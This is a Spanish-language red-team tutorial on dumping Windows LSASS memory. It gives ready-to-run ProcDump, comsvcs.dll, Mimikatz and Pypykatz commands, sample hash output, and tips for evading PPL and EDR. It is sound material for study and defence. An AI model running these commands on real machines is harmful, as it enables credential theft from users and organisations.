# Atacando LSASS

LSASS es el proceso más valioso para credential dumping en Windows. Mantiene en memoria las credenciales de todas las sesiones activas: hashes NT, tickets Kerberos y, en sistemas legacy o con WDigest activo, contraseñas en texto claro. Volcar su memoria es el objetivo estándar tras comprometer un host con privilegios elevados.

### Prerequisitos

Se necesita al menos uno de los siguientes:

* Privilegio `SeDebugPrivilege` (presente en cuentas de administrador local por defecto)
* Token de SYSTEM

### Método 1 — Task Manager (GUI, sin herramientas externas)

En sistemas donde se tiene acceso gráfico, el propio Task Manager puede crear un volcado de memoria:

1. Task Manager → pestaña Details
2. Click derecho sobre `lsass.exe` → "Create dump file"
3. Se genera `lsass.DMP` en `%TEMP%`

Después se exfiltra y se procesa con Mimikatz offline:

```
sekurlsa::minidump lsass.DMP
sekurlsa::logonpasswords
```

### Método 2 — ProcDump (Sysinternals)

```cmd
# Descargar ProcDump o usar el que esté en el sistema
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Método 3 — comsvcs.dll (sin binarios externos)

Esta técnica usa una DLL nativa de Windows para crear el dump, evitando subir herramientas al sistema:

```powershell
# Desde PowerShell con privilegios
$lsass_pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Temp\lsass.dmp full
```

### Método 4 — Mimikatz en vivo

Si se puede ejecutar Mimikatz directamente en el host comprometido:

```
privilege::debug
sekurlsa::logonpasswords        # hashes NT + contraseñas en claro si WDigest activo
sekurlsa::wdigest               # específicamente WDigest
sekurlsa::kerberos              # tickets Kerberos en memoria
sekurlsa::tspkg                 # credenciales RDP en sesiones activas
```

### Método 5 — Pypykatz (Python, análisis offline)

```bash
# Analizar dump desde Linux
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Salida típica de sekurlsa::logonpasswords

```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : jsmith
Domain            : EMPRESA
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : jsmith
         * Domain   : EMPRESA
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        wdigest :
         * Username : jsmith
         * Domain   : EMPRESA
         * Password : (null)          ← WDigest desactivado
        kerberos :
         * Username : jsmith
         * Domain   : EMPRESA.LOCAL
         * Password : (null)
```

### Protecciones y evasión

| Protección                        | Descripción                                 | Impacto                                      |
| --------------------------------- | ------------------------------------------- | -------------------------------------------- |
| **PPL** (Protected Process Light) | Marca LSASS como proceso protegido          | ProcDump y Task Manager no pueden hacer dump |
| **Credential Guard**              | Aísla LSASS en un VSM (Virtual Secure Mode) | Hashes no accesibles desde el SO principal   |
| **AV/EDR**                        | Detecta firmas de Mimikatz y acceso a LSASS | Requiere evasión (obfuscación, BYOVD)        |
| **WDigest desactivado**           | Clave de registro `UseLogonCredential=0`    | No hay plaintext en memoria                  |

Para evadir PPL se puede usar el driver `mimidrv.sys` de Mimikatz o técnicas BYOVD (Bring Your Own Vulnerable Driver).

> En entornos con Credential Guard (habitual en Windows 11 Enterprise y servidores modernos), los hashes NTLM no están accesibles en el proceso LSASS estándar. Solo se pueden obtener tickets Kerberos, y solo si el atacante tiene el control del KDC (DCSync).
